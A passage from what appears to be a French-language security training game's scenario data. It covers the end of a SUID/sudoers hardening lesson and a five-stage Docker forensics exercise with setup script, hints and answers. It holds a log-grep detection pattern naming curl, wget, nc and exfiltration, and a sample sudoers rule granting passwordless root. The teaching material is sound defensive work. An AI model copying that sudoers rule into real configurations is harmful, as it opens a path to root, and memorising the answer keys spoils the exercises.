    www-data ALL=(root) NOPASSWD: /opt/scripts/rotate_logs.sh

Checklist de durcissement :
  Auditer les SUID          → find / -perm -4000 2>/dev/null
  Auditer sudoers           → sudo -l pour chaque compte service
  Supprimer les SUID inutiles → chmod u-s /chemin/binaire
  Documenter chaque exception → commentaire dans sudoers`,
          },
        ],
      },
    ],
  },

  // ── THE ROGUE CONTAINER ──────────────────────────────────────────────────
  {
    id: 'rogue-container',
    duration: '35 min',
    durationKey: '35min',
    title: 'The Rogue Container',
    tagline: 'Un container Docker tourne depuis 4 jours. Personne ne l\'a déployé.',
    genre: 'Docker Forensics',
    difficulty: 2,
    difficultyLabel: 'Intermédiaire',
    accent: '#06b6d4',
    glow: 'rgba(6, 182, 212, 0.15)',
    totalStages: 5,
    intro: [
      "Ton collègue vérifie les ressources : 'CPU à 40% en idle, c'est normal ?'",
      "docker ps -a. Un container inconnu. Image : alpine. Nom : sys-monitor-daemon.",
      "Personne ne sait qui l'a lancé.",
      "Tu vas comprendre ce qu'il fait. Puis l'éliminer.",
    ],
    stages: [
      {
        id: 1,
        title: 'docker ps',
        narrative: `Première commande Docker de tout incident : lister ce qui tourne.

docker ps montre les containers actifs. docker ps -a inclut les containers arrêtés — les deux sont utiles.`,
        context: 'Setup : lance le container de simulation (nécessite Docker installé).',
        setup: `#!/bin/bash
if ! command -v docker &>/dev/null; then
  echo "Docker n'est pas installé."
  echo "macOS : installe Docker Desktop depuis docker.com"
  echo "Linux : sudo apt install docker.io && sudo systemctl start docker"
  exit 1
fi

docker rm -f sys-monitor-daemon 2>/dev/null || true

docker run -d \\
  --name sys-monitor-daemon \\
  --label "deployed-by=unknown" \\
  --label "purpose=monitoring" \\
  alpine:latest \\
  sh -c 'while true; do echo "collecting..." >> /tmp/log.txt; sleep 10; done'

echo "Container lancé. Lance : docker ps -a"`,
        task: `Lance docker ps -a et trouve le container suspect.

Quel est le nom exact du container ?`,
        clue: 'docker ps -a liste tous les containers, actifs et arrêtés.',
        hints: [
          'docker ps → containers actifs seulement',
          'docker ps -a → tous les containers (actifs + arrêtés)',
          'docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}"',
        ],
        answer: 'sys-monitor-daemon',
        answerLabel: 'Nom exact du container',
        explanation: 'docker ps -a est le point de départ de tout audit Docker. Les containers arrêtés (Status: Exited) peuvent aussi être suspects — un attaquant peut avoir lancé un container pour exécuter une tâche ponctuelle puis l\'avoir arrêté.',
        tools: ['docker ps', 'docker'],
        concepts: [
          {
            name: 'Docker : concepts de base',
            summary: 'Images, containers, daemon — le vocabulaire essentiel',
            content: `Docker permet d'isoler des applications dans des containers légers et portables.

Vocabulaire clé :
  Image     → template en lecture seule (ex: ubuntu:22.04, nginx:latest)
  Container → instance en cours d'exécution d'une image
  Daemon    → le service dockerd qui gère tout (tourne en background)
  Registry  → serveur d'images (Docker Hub, GitHub Container Registry, ECR...)

Commandes de base :
  docker ps           → containers actifs
  docker ps -a        → tous les containers (actifs + arrêtés)
  docker images       → images locales téléchargées
  docker ps -a --format "table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.CreatedAt}}"

Pourquoi Docker est populaire :
  Isolation des dépendances (chaque app a son environnement)
  Reproductible : tourne pareil sur toutes les machines avec Docker
  Déploiement rapide : docker run en secondes
  Léger : partage le noyau Linux (contrairement aux VMs)`,
          },
        ],
      },
      {
        id: 2,
        title: 'docker logs',
        narrative: `Le container tourne. Qu'est-ce qu'il fait depuis 4 jours ?

Les logs de container = tout ce que le process écrit sur stdout/stderr. Docker les capture automatiquement.`,
        context: 'Inspecte les logs.',
        setup: null,
        task: `Lis les 15 dernières lignes de logs du container sys-monitor-daemon.

Que répète-t-il en boucle ?`,
        clue: '--tail limite le nombre de lignes retournées par docker logs.',
        hints: [
          'docker logs sys-monitor-daemon → tous les logs',
          'docker logs --tail 15 sys-monitor-daemon → les 15 dernières lignes',
          'docker logs -f sys-monitor-daemon → suivre en temps réel (Ctrl+C pour quitter)',
        ],
        answer: 'collecting...',
        answerLabel: 'Ce que le container affiche en boucle',
        explanation: 'docker logs est indispensable pour comprendre le comportement d\'un container. Un container silencieux (aucun log, tout redirigé vers /dev/null) peut aussi être suspect — certains malwares font exactement ça.',
        tools: ['docker logs'],
        concepts: [
          {
            name: 'docker logs',
            summary: 'Lire la sortie standard d\'un container',
            content: `docker logs capture tout ce que le process principal écrit sur stdout et stderr.

  docker logs <nom>              → tous les logs
  docker logs --tail 50 <nom>    → 50 dernières lignes
  docker logs -f <nom>           → suivre en temps réel (comme tail -f)
  docker logs --since 1h <nom>   → depuis 1 heure
  docker logs -t <nom>           → avec timestamps

Astuce forensique :
  docker logs <nom> 2>&1 | grep -i "curl\\|wget\\|nc\\|error\\|exfil"

Limites :
  Si le container utilise un log driver différent (syslog, fluentd),
  docker logs peut ne rien montrer.
  Les logs anciens peuvent être perdus si json-file a une taille max configurée.

En prod : les logs sont souvent centralisés (Datadog, ELK, CloudWatch, Loki).`,
          },
        ],
      },
      {
        id: 3,
        title: 'docker inspect',
        narrative: `docker inspect donne la configuration complète du container au format JSON.

Volumes montés, ports exposés, variables d'environnement, labels — tout ce qui peut révéler les intentions de l'attaquant.`,
        context: 'Inspecte la configuration.',
        setup: null,
        task: `Inspecte sys-monitor-daemon avec docker inspect.

Quelle est la valeur du label "deployed-by" ?`,
        clue: '--format permet de filtrer le JSON sans installer jq.',
        hints: [
          'docker inspect sys-monitor-daemon → JSON complet (très verbeux)',
          'docker inspect --format "{{json .Config.Labels}}" sys-monitor-daemon',
          'docker inspect sys-monitor-daemon | grep -A5 "Labels"',
        ],
        answer: 'unknown',
        answerLabel: 'Valeur du label "deployed-by"',
        explanation: 'docker inspect est la radiographie d\'un container. Check systématique : labels (qui l\'a déployé ?), Mounts (quels dossiers host sont accessibles ?), Ports (quoi d\'exposé ?), Env (credentials en clair ?).',
        tools: ['docker inspect', 'grep'],
        concepts: [
          {
            name: 'docker inspect',
            summary: 'La configuration complète d\'un container',
            content: `docker inspect retourne la configuration JSON complète d'un container ou d'une image.

  docker inspect <nom>                               → JSON brut complet
  docker inspect --format "{{.State.Status}}" <nom>  → juste le statut
  docker inspect --format "{{json .Config.Env}}" <nom>   → variables d'env
  docker inspect --format "{{json .Mounts}}" <nom>       → volumes montés
  docker inspect --format "{{json .NetworkSettings.Ports}}" <nom>  → ports

Ce qu'on cherche en forensique :
  .Config.Env        → secrets/credentials en clair (fuite classique)
  .Mounts            → accès au filesystem host (/etc, /var, / monté = très dangereux)
  .NetworkSettings   → ports exposés vers l'extérieur
  .Config.Labels     → qui a créé ça, quand, pourquoi
  .HostConfig.Privileged → si true, le container a TOUS les droits host`,
          },
        ],
      },
      {
        id: 4,
        title: 'docker exec',
        narrative: `Tu peux entrer dans un container actif avec docker exec.

C'est comme un SSH vers le container — tu obtiens un shell à l'intérieur de l'environnement isolé.`,
        context: 'Entre dans le container.',
        setup: null,
        task: `Entre dans le container et compte les lignes de /tmp/log.txt.

Quelle commande one-liner docker exec utilises-tu pour lancer wc -l /tmp/log.txt sans ouvrir de shell interactif ?`,
        clue: 'docker exec peut lancer une commande directement sans -it si ce n\'est pas interactif.',
        hints: [
          'docker exec -it sys-monitor-daemon sh → shell interactif, puis wc -l /tmp/log.txt',
          'docker exec sys-monitor-daemon wc -l /tmp/log.txt → one-liner direct',
          'docker exec sys-monitor-daemon cat /tmp/log.txt | wc -l → aussi valide',
        ],
        answer: 'docker exec sys-monitor-daemon wc -l /tmp/log.txt',
        answerLabel: 'La commande one-liner complète',
        explanation: 'docker exec lance une commande dans un container actif. Sans -it : commande non-interactive. Avec -it : shell interactif. En forensique c\'est indispensable pour inspecter l\'intérieur du container.',
        tools: ['docker exec', 'wc', 'sh'],
        concepts: [
          {
            name: 'docker exec',
            summary: 'Exécuter des commandes dans un container actif',
            content: `docker exec lance une commande dans un container en cours d'exécution.

  docker exec <nom> commande            → commande non-interactive
  docker exec -it <nom> sh             → shell interactif (sh)
  docker exec -it <nom> bash           → shell interactif (bash, si dispo)
  docker exec -u root <nom> commande   → en tant que root dans le container
  docker exec -w /app <nom> ls         → depuis un répertoire spécifique

Flags importants :
  -i  → interactif (garde stdin ouvert)
  -t  → pseudo-TTY (nécessaire pour les shells)
  -u  → utilisateur dans le container
  -w  → répertoire de travail

Pour un container ARRÊTÉ :
  docker cp <nom>:/chemin/fichier ./  → extraire un fichier sans le relancer
  docker start <nom>                  → le relancer d'abord`,
          },
        ],
      },
      {
        id: 5,
        title: 'Kill & Cleanup',
        narrative: `Container analysé. Il est temps de faire le ménage proprement.

L'ordre : stop → rm → (optionnel) rmi pour l'image.`,
        context: 'Nettoie le container.',
        setup: null,
        task: `Arrête et supprime sys-monitor-daemon en une seule commande.

Quelle commande force l'arrêt ET la suppression en un seul appel ?`,
        clue: 'docker rm avec l\'option -f force l\'arrêt avant la suppression.',
        hints: [
          'docker stop sys-monitor-daemon && docker rm sys-monitor-daemon → deux étapes',
          'docker rm -f sys-monitor-daemon → force stop + suppression en une commande',
          'Vérifie : docker ps -a | grep sys-monitor-daemon → doit être vide',
        ],
        answer: 'docker rm -f sys-monitor-daemon',
        answerLabel: 'La commande one-liner (avec -f)',
        explanation: 'docker rm -f force l\'arrêt (SIGKILL) avant la suppression. En prod, préfère docker stop (SIGTERM, arrêt gracieux) puis docker rm — ça laisse le temps au container de terminer ses opérations.',
        tools: ['docker stop', 'docker rm', 'docker ps'],
        concepts: [
          {
            name: 'Cycle de vie d\'un container Docker',
            summary: 'Créer, démarrer, arrêter, supprimer',
            content: `États d'un container :
  created → running → paused → stopped → removed

Commandes :
  docker run <image>     → crée + démarre en une fois
  docker start <nom>     → démarre un container arrêté
  docker stop <nom>      → arrêt gracieux (SIGTERM, puis SIGKILL après 10s)
  docker kill <nom>      → arrêt immédiat (SIGKILL)
  docker pause <nom>     → gèle le container (SIGSTOP)
  docker rm <nom>        → supprime (doit être arrêté)
  docker rm -f <nom>     → force stop + suppression

Nettoyage complet d'un système :
  docker system prune         → containers arrêtés + images dangling
  docker system prune -a      → + toutes les images non utilisées
  docker volume prune         → volumes orphelins

Bonne pratique :
  Toujours nommer tes containers (--name)
  Toujours labelliser avec qui/quoi/pourquoi (--label)
  Auditer docker ps -a régulièrement en prod`,
          },
        ],
      },
    ],
  },
]
